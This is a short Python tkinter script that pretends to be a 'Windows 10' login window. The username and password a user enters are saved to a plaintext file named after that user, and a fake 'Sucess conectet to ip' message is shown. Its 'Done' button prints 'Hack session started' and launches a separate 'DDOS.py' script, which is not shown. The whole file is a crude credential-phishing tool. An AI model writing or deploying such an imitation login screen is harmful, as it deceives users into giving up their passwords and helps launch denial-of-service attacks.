
from tkinter import *
import os


def register_user():

  username_info = username.get()
  password_info = password.get()

  file=open(username_info+".txt", "w")
  file.write("username: "+username_info+"\n")
  file.write("pass:            "+password_info)
  file.close()

  username_entry.delete(0, END)
  password_entry.delete(0, END)

  Label(screen1, text = "Sucess conectet to ip. press done", fg = "green" ,font = ("calibri", 11)).pack()

def register():
  global screen1
  screen1 = Toplevel(screen)
  screen1.title("inlogen")
  screen1.geometry("300x250")
  bg = "#6dec69"
  
  global username
  global password
  global username_entry
  global password_entry
  username = StringVar()
  password = StringVar()

  Label(screen1, text = "Please enter name and pasword").pack()
  Label(screen1, text = "").pack()
  Label(screen1, text = "Username * ").pack()
  username_entry = Entry(screen1, textvariable = username)
  username_entry.pack()
  Label(screen1, text = "Password * ").pack()
  password_entry =  Entry(screen1, textvariable = password)
  password_entry.pack()
  Label(screen1, text = "").pack()
  Button(screen1, text = "login", width = 10, bg = "#ffffff", height = 1, command = register_user).pack()

def login():
  print("Hack session started")
  os.system("cls")
  os.system("python DDOS.py")

def website():
    print("website")

def main_screen():
  global screen
  screen = Tk()
  screen.geometry("300x250")
  screen.title("Windows 10")
  Label(text = "Please login to windows 10", bg = "#1197D5", width = "300", height = "2", font = ("Calibri", 13)).pack()
  Label(text = "").pack()
  Button(text = "Done", height = "1", bg = "#49FF00", width = "15", command = login).pack()
  Label(text = "").pack()
  Label(text = "").pack()
  Button(text = "login",height = "1", bg = "#0fb9fb", width = "15", command = register).pack()
  Label(text = "").pack()
  Button(text = "website",height = "1", bg = "#0fb9fb", width = "15", command = website).pack()
  screen.mainloop()

main_screen()